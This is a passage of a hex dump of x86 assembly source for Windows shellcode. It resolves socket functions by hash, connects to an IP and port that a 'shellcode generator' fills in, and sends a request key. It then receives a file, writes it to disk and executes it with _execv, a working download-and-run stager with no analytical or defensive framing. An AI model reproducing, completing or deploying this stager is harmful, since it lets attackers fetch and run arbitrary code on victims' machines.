000012b0  20 3b 20 73 6f 63 6b 65  74 0d 0a 20 20 20 64 64  | ; socket..   dd|
000012c0  20 30 31 41 44 33 30 31  38 33 68 20 3b 20 63 6f  | 01AD30183h ; co|
000012d0  6e 6e 65 63 74 0d 0a 20  20 20 64 64 20 30 30 37  |nnect..   dd 007|
000012e0  31 33 30 32 43 30 68 20  3b 20 72 65 63 76 0d 0a  |1302C0h ; recv..|
000012f0  20 20 20 64 64 20 30 30  37 30 33 33 34 38 30 68  |   dd 007033480h|
00001300  20 3b 20 73 65 6e 64 0d  0a 20 20 20 64 64 20 30  | ; send..   dd 0|
00001310  32 38 33 39 38 41 42 34  68 20 3b 20 63 6c 6f 73  |28398AB4h ; clos|
00001320  65 73 6f 63 6b 65 74 0d  0a 4f 76 65 72 49 6d 70  |esocket..OverImp|
00001330  6f 72 74 48 61 73 68 65  73 3a 0d 0a 20 20 20 70  |ortHashes:..   p|
00001340  6f 70 20 20 20 65 62 70  0d 0a 20 20 20 70 75 73  |op   ebp..   pus|
00001350  68 20 20 32 0d 0a 20 20  20 70 6f 70 20 20 20 65  |h  2..   pop   e|
00001360  62 78 0d 0a 47 65 74 49  6d 70 6f 72 74 41 64 64  |bx..GetImportAdd|
00001370  72 65 73 73 4f 66 4e 65  78 74 44 6c 6c 3a 0d 0a  |ressOfNextDll:..|
00001380  20 20 20 6d 6f 76 20 20  20 65 64 69 2c 20 65 61  |   mov   edi, ea|
00001390  78 0d 0a 20 20 20 70 75  73 68 20 20 65 62 78 0d  |x..   push  ebx.|
000013a0  0a 47 65 74 49 6d 70 6f  72 74 41 64 64 72 65 73  |.GetImportAddres|
000013b0  73 65 73 4c 6f 6f 70 3a  0d 0a 20 20 20 70 75 73  |sesLoop:..   pus|
000013c0  68 20 20 65 62 78 0d 0a  20 20 20 47 65 74 49 6d  |h  ebx..   GetIm|
000013d0  70 6f 72 74 41 64 64 72  65 73 73 0d 0a 20 20 20  |portAddress..   |
000013e0  70 6f 70 20 20 20 65 62  78 0d 0a 20 20 20 64 65  |pop   ebx..   de|
000013f0  63 20 20 20 65 62 78 0d  0a 20 20 20 6a 6e 7a 20  |c   ebx..   jnz |
00001400  20 20 47 65 74 49 6d 70  6f 72 74 41 64 64 72 65  |  GetImportAddre|
00001410  73 73 65 73 4c 6f 6f 70  0d 0a 0d 0a 20 20 20 70  |ssesLoop....   p|
00001420  6f 70 20 20 20 65 62 78  0d 0a 20 20 20 61 64 64  |op   ebx..   add|
00001430  20 20 20 65 62 78 2c 20  32 0d 0a 20 20 20 70 75  |   ebx, 2..   pu|
00001440  73 68 20 20 65 73 70 20  20 20 20 20 20 20 20 20  |sh  esp         |
00001450  20 20 20 20 20 20 20 20  20 20 3b 20 70 75 73 68  |          ; push|
00001460  20 6d 6f 64 75 6c 65 68  61 6e 64 6c 65 0d 0a 20  | modulehandle.. |
00001470  20 20 63 61 6c 6c 20 20  64 77 6f 72 64 20 70 74  |  call  dword pt|
00001480  72 20 5b 65 62 70 20 2b  20 30 38 68 5d 20 3b 20  |r [ebp + 08h] ; |
00001490  63 61 6c 6c 20 6b 65 72  6e 65 6c 33 32 2e 4c 6f  |call kernel32.Lo|
000014a0  61 64 4c 69 62 72 61 72  79 41 0d 0a 20 20 20 61  |adLibraryA..   a|
000014b0  64 64 20 20 20 65 73 70  2c 20 38 20 20 20 20 20  |dd   esp, 8     |
000014c0  20 20 20 20 20 20 20 20  20 20 20 3b 20 6e 65 78  |           ; nex|
000014d0  74 20 6d 6f 64 75 6c 65  0d 0a 20 20 20 74 65 73  |t module..   tes|
000014e0  74 20 20 65 61 78 2c 20  65 61 78 0d 0a 20 20 20  |t  eax, eax..   |
000014f0  6a 6e 7a 20 20 20 47 65  74 49 6d 70 6f 72 74 41  |jnz   GetImportA|
00001500  64 64 72 65 73 73 4f 66  4e 65 78 74 44 6c 6c 0d  |ddressOfNextDll.|
00001510  0a 0d 0a 20 20 20 6d 6f  76 20 20 20 61 68 2c 20  |...   mov   ah, |
00001520  30 32 68 20 20 20 20 20  20 20 20 20 20 20 20 20  |02h             |
00001530  20 20 3b 20 65 61 78 20  3d 20 30 30 30 30 30 32  |  ; eax = 000002|
00001540  30 30 0d 0a 20 20 20 73  75 62 20 20 20 65 73 70  |00..   sub   esp|
00001550  2c 20 65 61 78 0d 0a 0d  0a 3b 20 2a 2a 2a 20 63  |, eax....; *** c|
00001560  6f 6e 6e 65 63 74 20 74  6f 20 49 50 20 2a 2a 2a  |onnect to IP ***|
00001570  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000015a0  2a 2a 2a 2a 2a 2a 2a 2a  2a 0d 0a 0d 0a 20 20 20  |*********....   |
000015b0  6d 6f 76 20 20 20 61 6c  2c 20 61 68 20 20 20 20  |mov   al, ah    |
000015c0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 65 61  |            ; ea|
000015d0  78 20 3d 20 30 30 30 30  30 32 30 32 0d 0a 0d 0a  |x = 00000202....|
000015e0  20 20 20 3b 20 69 6e 69  74 69 61 6c 69 7a 65 20  |   ; initialize |
000015f0  77 73 32 5f 33 32 2e 64  6c 6c 0d 0a 20 20 20 70  |ws2_32.dll..   p|
00001600  75 73 68 20 20 65 73 70  20 20 20 20 20 20 20 20  |ush  esp        |
00001610  20 20 20 20 20 20 20 20  20 20 20 3b 20 6f 75 72  |           ; our|
00001620  20 72 65 63 65 69 76 65  20 62 75 66 66 65 72 20  | receive buffer |
00001630  28 61 62 75 73 65 64 20  61 73 20 57 53 41 44 41  |(abused as WSADA|
00001640  54 41 20 73 74 72 75 63  74 29 0d 0a 20 20 20 70  |TA struct)..   p|
00001650  75 73 68 20 20 65 61 78  20 20 20 20 20 20 20 20  |ush  eax        |
00001660  20 20 20 20 20 20 20 20  20 20 20 3b 20 77 65 20  |           ; we |
00001670  73 75 70 70 6f 72 74 20  32 2e 32 20 61 6e 64 20  |support 2.2 and |
00001680  61 62 6f 76 65 0d 0a 20  20 20 63 61 6c 6c 20 20  |above..   call  |
00001690  5f 5f 69 6d 70 5f 57 53  41 53 74 61 72 74 75 70  |__imp_WSAStartup|
000016a0  20 20 20 20 20 20 3b 20  77 68 65 6e 20 63 61 6c  |      ; when cal|
000016b0  6c 20 73 75 63 63 65 73  66 75 6c 2c 20 77 69 6c  |l succesful, wil|
000016c0  6c 20 72 65 74 75 72 6e  20 30 0d 0a 20 20 0d 0a  |l return 0..  ..|
000016d0  20 20 20 3b 20 73 65 74  20 75 70 20 53 4f 43 4b  |   ; set up SOCK|
000016e0  41 44 44 52 5f 49 4e 20  73 74 72 75 63 74 75 72  |ADDR_IN structur|
000016f0  65 0d 0a 20 20 20 70 75  73 68 20 20 65 61 78 20  |e..   push  eax |
00001700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001710  20 20 3b 20 30 0d 0a 20  20 20 70 75 73 68 20 20  |  ; 0..   push  |
00001720  65 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |eax             |
00001730  20 20 20 20 20 20 3b 20  30 0d 0a 20 20 20 70 75  |      ; 0..   pu|
00001740  73 68 20 20 31 31 31 31  31 31 31 31 68 20 20 20  |sh  11111111h   |
00001750  20 20 20 20 20 20 20 20  20 20 3b 20 69 70 20 28  |          ; ip (|
00001760  77 69 6c 6c 20 62 65 20  73 65 74 20 62 79 20 73  |will be set by s|
00001770  68 65 6c 6c 63 6f 64 65  20 67 65 6e 65 72 61 74  |hellcode generat|
00001780  6f 72 29 0d 0a 20 20 20  70 75 73 68 20 20 32 32  |or)..   push  22|
00001790  32 32 30 30 30 32 68 20  20 20 20 20 20 20 20 20  |220002h         |
000017a0  20 20 20 20 3b 20 41 46  5f 49 4e 45 54 20 26 20  |    ; AF_INET & |
000017b0  70 6f 72 74 20 28 70 6f  72 74 20 77 69 6c 6c 20  |port (port will |
000017c0  62 65 20 73 65 74 20 62  79 20 73 68 65 6c 6c 63  |be set by shellc|
000017d0  6f 64 65 20 67 65 6e 65  72 61 74 6f 72 29 0d 0a  |ode generator)..|
000017e0  20 20 20 6d 6f 76 20 20  20 65 64 69 2c 20 65 73  |   mov   edi, es|
000017f0  70 0d 0a 0d 0a 20 20 20  70 75 73 68 20 20 65 61  |p....   push  ea|
00001800  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x               |
00001810  20 20 20 20 3b 20 49 50  50 52 4f 54 4f 5f 49 50  |    ; IPPROTO_IP|
00001820  0d 0a 20 20 20 70 75 73  68 20 20 31 20 20 20 20  |..   push  1    |
00001830  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001840  20 3b 20 53 4f 43 4b 5f  53 54 52 45 41 4d 0d 0a  | ; SOCK_STREAM..|
00001850  20 20 20 70 75 73 68 20  20 32 20 20 20 20 20 20  |   push  2      |
00001860  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00001870  20 41 46 5f 49 4e 45 54  0d 0a 20 20 20 63 61 6c  | AF_INET..   cal|
00001880  6c 20 20 5f 5f 69 6d 70  5f 73 6f 63 6b 65 74 20  |l  __imp_socket |
00001890  20 20 20 20 20 20 20 20  20 3b 20 63 61 6c 6c 20  |         ; call |
000018a0  77 73 32 5f 33 32 2e 73  6f 63 6b 65 74 0d 0a 20  |ws2_32.socket.. |
000018b0  20 20 6d 6f 76 20 20 20  65 62 78 2c 20 65 61 78  |  mov   ebx, eax|
000018c0  0d 0a 0d 0a 20 20 20 3b  20 63 61 6c 6c 20 69 74  |....   ; call it|
000018d0  0d 0a 20 20 20 70 75 73  68 20 20 31 30 68 20 20  |..   push  10h  |
000018e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000018f0  20 3b 20 73 69 7a 65 6f  66 20 53 4f 43 4b 41 44  | ; sizeof SOCKAD|
00001900  44 52 5f 49 4e 0d 0a 20  20 20 70 75 73 68 20 20  |DR_IN..   push  |
00001910  65 64 69 20 20 20 20 20  20 20 20 20 20 20 20 20  |edi             |
00001920  20 20 20 20 20 20 3b 20  70 74 72 20 53 4f 43 4b  |      ; ptr SOCK|
00001930  41 44 44 52 5f 49 4e 0d  0a 20 20 20 70 75 73 68  |ADDR_IN..   push|
00001940  20 20 65 62 78 20 20 20  20 20 20 20 20 20 20 20  |  ebx           |
00001950  20 20 20 20 20 20 20 20  3b 20 73 6f 63 6b 65 74  |        ; socket|
00001960  0d 0a 20 20 20 63 61 6c  6c 20 20 5f 5f 69 6d 70  |..   call  __imp|
00001970  5f 63 6f 6e 6e 65 63 74  20 20 20 20 20 20 20 20  |_connect        |
00001980  20 3b 20 63 61 6c 6c 20  77 73 32 5f 33 32 2e 63  | ; call ws2_32.c|
00001990  6f 6e 6e 65 63 74 0d 0a  20 20 20 3b 20 74 68 65  |onnect..   ; the|
000019a0  20 6f 6e 6c 79 20 63 68  65 63 6b 21 0d 0a 20 20  | only check!..  |
000019b0  20 74 65 73 74 20 20 65  61 78 2c 20 65 61 78 0d  | test  eax, eax.|
000019c0  0a 20 20 20 6a 6e 7a 20  20 20 45 78 69 74 0d 0a  |.   jnz   Exit..|
000019d0  0d 0a 3b 20 2a 2a 2a 20  73 65 6e 64 20 74 68 65  |..; *** send the|
000019e0  20 72 65 71 75 65 73 74  20 6b 65 79 20 2a 2a 2a  | request key ***|
000019f0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00001a20  2a 2a 0d 0a 0d 0a 20 20  20 6d 6f 76 20 20 20 64  |**....   mov   d|
00001a30  77 6f 72 64 20 70 74 72  20 5b 65 62 70 5d 2c 20  |word ptr [ebp], |
00001a40  33 33 33 33 33 33 33 33  68 20 3b 20 72 65 71 75  |33333333h ; requ|
00001a50  65 73 74 20 6b 65 79 20  28 77 69 6c 6c 20 62 65  |est key (will be|
00001a60  20 73 65 74 20 62 79 20  73 68 65 6c 6c 63 6f 64  | set by shellcod|
00001a70  65 20 67 65 6e 65 72 61  74 6f 72 29 0d 0a 0d 0a  |e generator)....|
00001a80  20 20 20 70 75 73 68 20  20 65 61 78 20 20 20 20  |   push  eax    |
00001a90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001aa0  20 20 20 20 3b 20 66 6c  61 67 73 20 28 30 29 0d  |    ; flags (0).|
00001ab0  0a 20 20 20 70 75 73 68  20 20 34 20 20 20 20 20  |.   push  4     |
00001ac0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001ad0  20 20 20 20 20 3b 20 6c  65 6e 67 74 68 20 28 34  |     ; length (4|
00001ae0  29 0d 0a 20 20 20 70 75  73 68 20 20 65 62 70 20  |)..   push  ebp |
00001af0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001b00  20 20 20 20 20 20 20 3b  20 62 75 66 66 65 72 0d  |       ; buffer.|
00001b10  0a 20 20 20 70 75 73 68  20 20 65 62 78 20 20 20  |.   push  ebx   |
00001b20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001b30  20 20 20 20 20 3b 20 73  6f 63 6b 65 74 0d 0a 20  |     ; socket.. |
00001b40  20 20 63 61 6c 6c 20 20  5f 5f 69 6d 70 5f 73 65  |  call  __imp_se|
00001b50  6e 64 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |nd              |
00001b60  20 20 20 3b 20 63 61 6c  6c 20 77 73 32 5f 33 32  |   ; call ws2_32|
00001b70  2e 73 65 6e 64 0d 0a 0d  0a 3b 20 2a 2a 2a 20 72  |.send....; *** r|
00001b80  65 63 65 69 76 65 20 66  69 6c 65 20 2a 2a 2a 2a  |eceive file ****|
00001b90  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00001bc0  2a 2a 2a 2a 2a 2a 2a 2a  2a 0d 0a 0d 0a 20 20 20  |*********....   |
00001bd0  6d 6f 76 20 20 20 65 73  69 2c 20 65 73 70 20 20  |mov   esi, esp  |
00001be0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001bf0  20 20 3b 20 73 61 76 65  20 70 6f 69 6e 74 65 72  |  ; save pointer|
00001c00  20 74 6f 20 62 75 66 66  65 72 20 69 6e 20 65 73  | to buffer in es|
00001c10  69 0d 0a 0d 0a 20 20 20  3b 20 77 65 20 77 61 6e  |i....   ; we wan|
00001c20  74 20 72 65 61 64 2f 77  72 69 74 65 20 61 63 63  |t read/write acc|
00001c30  65 73 73 0d 0a 20 20 20  6d 6f 76 20 20 20 64 77  |ess..   mov   dw|
00001c40  6f 72 64 20 70 74 72 20  5b 65 62 70 5d 2c 20 27  |ord ptr [ebp], '|
00001c50  62 77 27 0d 0a 20 20 20  70 75 73 68 20 20 27 65  |bw'..   push  'e|
00001c60  78 65 27 20 20 20 20 20  20 20 20 20 20 20 20 20  |xe'             |
00001c70  20 20 20 20 20 20 20 20  20 20 3b 20 73 65 63 6f  |          ; seco|
00001c80  6e 64 20 70 61 72 74 20  30 2c 20 27 65 78 65 27  |nd part 0, 'exe'|
00001c90  0d 0a 20 20 20 70 75 73  68 20 20 27 2e 78 78 78  |..   push  '.xxx|
00001ca0  27 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |'               |
00001cb0  20 20 20 20 20 20 20 3b  20 66 69 72 73 74 20 70  |       ; first p|
00001cc0  61 72 74 20 27 2e 78 78  78 27 20 28 77 69 6c 6c  |art '.xxx' (will|
00001cd0  20 62 65 20 73 65 74 20  62 79 20 67 65 6e 65 72  | be set by gener|
00001ce0  61 74 6f 72 29 0d 0a 20  20 20 6d 6f 76 20 20 20  |ator)..   mov   |
00001cf0  65 64 69 2c 20 65 73 70  20 20 20 20 20 20 20 20  |edi, esp        |
00001d00  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 73 61  |            ; sa|
00001d10  76 65 20 66 69 6c 65 6e  61 6d 65 20 69 6e 20 65  |ve filename in e|
00001d20  64 69 0d 0a 20 20 20 70  75 73 68 20 20 65 62 70  |di..   push  ebp|
00001d30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001d40  20 20 20 20 20 20 20 20  20 3b 20 70 75 73 68 20  |         ; push |
00001d50  70 6f 69 6e 74 65 72 20  74 6f 20 27 77 62 27 0d  |pointer to 'wb'.|
00001d60  0a 20 20 20 70 75 73 68  20 20 65 64 69 20 20 20  |.   push  edi   |
00001d70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001d80  20 20 20 20 20 20 3b 20  70 75 73 68 20 70 6f 69  |      ; push poi|
00001d90  6e 74 65 72 20 74 6f 20  66 69 6c 65 6e 61 6d 65  |nter to filename|
00001da0  0d 0a 20 20 20 63 61 6c  6c 20 20 5f 5f 69 6d 70  |..   call  __imp|
00001db0  5f 66 6f 70 65 6e 20 20  20 20 20 20 20 20 20 20  |_fopen          |
00001dc0  20 20 20 20 20 20 20 3b  20 63 61 6c 6c 20 6d 73  |       ; call ms|
00001dd0  76 72 74 2e 66 6f 70 65  6e 0d 0a 20 20 20 6d 6f  |vrt.fopen..   mo|
00001de0  76 20 20 20 5b 65 62 70  5d 2c 20 65 61 78 20 20  |v   [ebp], eax  |
00001df0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e00  3b 20 6d 6f 76 65 20 46  49 4c 45 20 73 74 72 65  |; move FILE stre|
00001e10  61 6d 20 69 6e 20 65 73  69 0d 0a 20 20 20 3b 20  |am in esi..   ; |
00001e20  61 64 64 20 20 20 65 73  70 2c 20 38 20 20 20 20  |add   esp, 8    |
00001e30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e40  3b 20 6e 6f 20 6e 65 65  64 20 74 6f 20 63 6c 65  |; no need to cle|
00001e50  61 6e 20 73 74 61 63 6b  0d 0a 0d 0a 20 20 20 3b  |an stack....   ;|
00001e60  20 72 65 63 65 69 76 65  20 6c 6f 6f 70 0d 0a 52  | receive loop..R|
00001e70  65 63 65 69 76 65 46 69  6c 65 3a 0d 0a 20 20 20  |eceiveFile:..   |
00001e80  70 75 73 68 20 20 30 20  20 20 20 20 20 20 20 20  |push  0         |
00001e90  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 66 6c  |            ; fl|
00001ea0  61 67 73 0d 0a 20 20 20  70 75 73 68 20 20 35 31  |ags..   push  51|
00001eb0  32 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2               |
00001ec0  20 20 20 20 3b 20 62 75  66 66 65 72 73 69 7a 65  |    ; buffersize|
00001ed0  0d 0a 20 20 20 70 75 73  68 20 20 65 73 69 20 20  |..   push  esi  |
00001ee0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001ef0  20 3b 20 62 75 66 66 65  72 0d 0a 20 20 20 70 75  | ; buffer..   pu|
00001f00  73 68 20 20 65 62 78 20  20 20 20 20 20 20 20 20  |sh  ebx         |
00001f10  20 20 20 20 20 20 20 20  20 20 3b 20 73 6f 63 6b  |          ; sock|
00001f20  65 74 0d 0a 20 20 20 63  61 6c 6c 20 20 5f 5f 69  |et..   call  __i|
00001f30  6d 70 5f 72 65 63 76 20  20 20 20 20 20 20 20 20  |mp_recv         |
00001f40  20 20 20 3b 20 63 61 6c  6c 20 77 73 32 5f 33 32  |   ; call ws2_32|
00001f50  2e 72 65 63 76 0d 0a 20  20 20 74 65 73 74 20 20  |.recv..   test  |
00001f60  65 61 78 2c 20 65 61 78  0d 0a 20 20 20 6a 7a 20  |eax, eax..   jz |
00001f70  20 20 20 44 6f 6e 65 52  65 63 65 69 76 69 6e 67  |   DoneReceiving|
00001f80  0d 0a 20 20 20 6a 73 20  20 20 20 45 78 69 74 0d  |..   js    Exit.|
00001f90  0a 0d 0a 20 20 20 70 75  73 68 20 20 5b 65 62 70  |...   push  [ebp|
00001fa0  5d 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |]               |
00001fb0  20 20 3b 20 46 49 4c 45  0d 0a 20 20 20 70 75 73  |  ; FILE..   pus|
00001fc0  68 20 20 65 61 78 20 20  20 20 20 20 20 20 20 20  |h  eax          |
00001fd0  20 20 20 20 20 20 20 20  20 3b 20 6e 69 74 65 6d  |         ; nitem|
00001fe0  73 0d 0a 20 20 20 70 75  73 68 20 20 31 20 20 20  |s..   push  1   |
00001ff0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002000  20 20 3b 20 69 74 65 6d  20 73 69 7a 65 0d 0a 20  |  ; item size.. |
00002010  20 20 70 75 73 68 20 20  65 73 69 20 20 20 20 20  |  push  esi     |
00002020  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00002030  62 75 66 66 65 72 0d 0a  20 20 20 63 61 6c 6c 20  |buffer..   call |
00002040  20 5f 5f 69 6d 70 5f 66  77 72 69 74 65 20 20 20  | __imp_fwrite   |
00002050  20 20 20 20 20 20 20 3b  20 63 61 6c 6c 20 6d 73  |       ; call ms|
00002060  76 63 72 74 2e 66 77 72  69 74 65 0d 0a 20 20 20  |vcrt.fwrite..   |
00002070  61 64 64 20 20 20 65 73  70 2c 20 31 30 68 20 20  |add   esp, 10h  |
00002080  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 63 6c  |            ; cl|
00002090  65 61 6e 20 73 74 61 63  6b 0d 0a 0d 0a 20 20 20  |ean stack....   |
000020a0  6a 6d 70 20 20 20 52 65  63 65 69 76 65 46 69 6c  |jmp   ReceiveFil|
000020b0  65 0d 0a 0d 0a 44 6f 6e  65 52 65 63 65 69 76 69  |e....DoneReceivi|
000020c0  6e 67 3a 0d 0a 20 20 20  70 75 73 68 20 20 5b 65  |ng:..   push  [e|
000020d0  62 70 5d 20 20 20 20 20  20 20 20 20 3b 20 70 75  |bp]         ; pu|
000020e0  73 68 20 46 49 4c 45 20  73 74 72 65 61 6d 20 74  |sh FILE stream t|
000020f0  6f 20 63 6c 6f 73 65 0d  0a 20 20 20 63 61 6c 6c  |o close..   call|
00002100  20 20 5f 5f 69 6d 70 5f  66 63 6c 6f 73 65 20 20  |  __imp_fclose  |
00002110  3b 20 63 61 6c 6c 20 6d  73 76 63 72 74 2e 66 63  |; call msvcrt.fc|
00002120  6c 6f 73 65 2c 20 72 65  74 75 72 6e 73 20 30 20  |lose, returns 0 |
00002130  69 66 20 73 75 63 63 65  73 66 75 6c 0d 0a 20 20  |if succesful..  |
00002140  20 3b 20 61 64 64 20 20  20 65 73 70 2c 20 34 20  | ; add   esp, 4 |
00002150  20 20 20 20 20 3b 20 6e  6f 74 20 6e 65 65 64 65  |     ; not neede|
00002160  64 20 74 6f 20 63 6c 65  61 6e 20 73 74 61 63 6b  |d to clean stack|
00002170  0d 0a 0d 0a 20 20 20 70  75 73 68 20 20 65 61 78  |....   push  eax|
00002180  0d 0a 20 20 20 70 75 73  68 20 20 65 73 70 20 20  |..   push  esp  |
00002190  20 20 20 20 20 20 20 20  20 3b 20 76 61 72 67 75  |         ; vargu|
000021a0  6d 65 6e 74 73 0d 0a 20  20 20 70 75 73 68 20 20  |ments..   push  |
000021b0  65 64 69 20 20 20 20 20  20 20 20 20 20 20 3b 20  |edi           ; |
000021c0  66 69 6c 65 6e 61 6d 65  0d 0a 20 20 20 63 61 6c  |filename..   cal|
000021d0  6c 20 20 5f 5f 69 6d 70  5f 5f 65 78 65 63 76 20  |l  __imp__execv |
000021e0  20 3b 20 63 61 6c 6c 20  6d 73 76 63 72 74 2e 5f  | ; call msvcrt._|
000021f0  65 78 65 63 76 0d 0a 20  20 20 3b 20 61 64 64 20  |execv..   ; add |
00002200  20 20 65 73 70 2c 20 38  20 20 20 20 20 20 3b 20  |  esp, 8      ; |
00002210  6e 6f 74 20 6e 65 65 64  65 64 20 74 6f 20 63 6c  |not needed to cl|
00002220  65 61 6e 20 73 74 61 63  6b 0d 0a 0d 0a 45 78 69  |ean stack....Exi|
00002230  74 3a 0d 0a 20 20 20 70  75 73 68 20 20 65 62 78  |t:..   push  ebx|
00002240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002260  3b 20 73 6f 63 6b 65 74  0d 0a 20 20 20 63 61 6c  |; socket..   cal|
00002270  6c 20 20 5f 5f 69 6d 70  5f 63 6c 6f 73 65 73 6f  |l  __imp_closeso|
00002280  63 6b 65 74 20 20 20 20  20 20 20 20 20 20 20 20  |cket            |
00002290  20 20 20 20 20 20 3b 20  63 61 6c 6c 20 77 73 32  |      ; call ws2|
000022a0  5f 33 32 2e 63 6c 6f 73  65 73 6f 63 6b 65 74 0d  |_32.closesocket.|
000022b0  0a 0d 0a 20 20 20 3b 20  70 75 73 68 20 20 30 20  |...   ; push  0 |
000022c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000022d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
000022e0  20 77 65 20 64 6f 6e 27  74 20 63 61 72 65 20 61  | we don't care a|
000022f0  62 6f 75 74 20 74 68 65  20 65 78 69 74 20 63 6f  |bout the exit co|
00002300  64 65 20 20 20 20 0d 0a  20 20 20 63 61 6c 6c 20  |de    ..   call |
00002310  20 5f 5f 69 6d 70 5f 45  78 69 74 54 68 72 65 61  | __imp_ExitThrea|
00002320  64 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |d               |
00002330  20 20 20 20 3b 20 63 61  6c 6c 20 6b 65 72 6e 65  |    ; call kerne|
00002340  6c 33 32 2e 45 78 69 74  54 68 72 65 61 64 0d 0a  |l32.ExitThread..|
00002350  0d 0a 3b 20 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |..; ************|
00002360  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
00002370  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2b 2a  |**************+*|
00002380  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000023a0  2a 0d 0a 20 20 20 64 62  20 27 3c 2d 45 4e 44 27  |*..   db '<-END'|
000023b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000023c0  20 3b 20 65 6e 64 20 6f  66 20 73 68 65 6c 6c 63  | ; end of shellc|
000023d0  6f 64 65 0d 0a 3b 20 2a  2a 2a 2a 2a 2a 2a 2a 2a  |ode..; *********|
000023e0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00002400  2a 2b 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |*+**************|
00002410  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
00002420  2a 2a 2a 2a 0d 0a 0d 0a  65 6e 64 20 73 74 61 72  |****....end star|
00002430  74                                                |t|
00002431
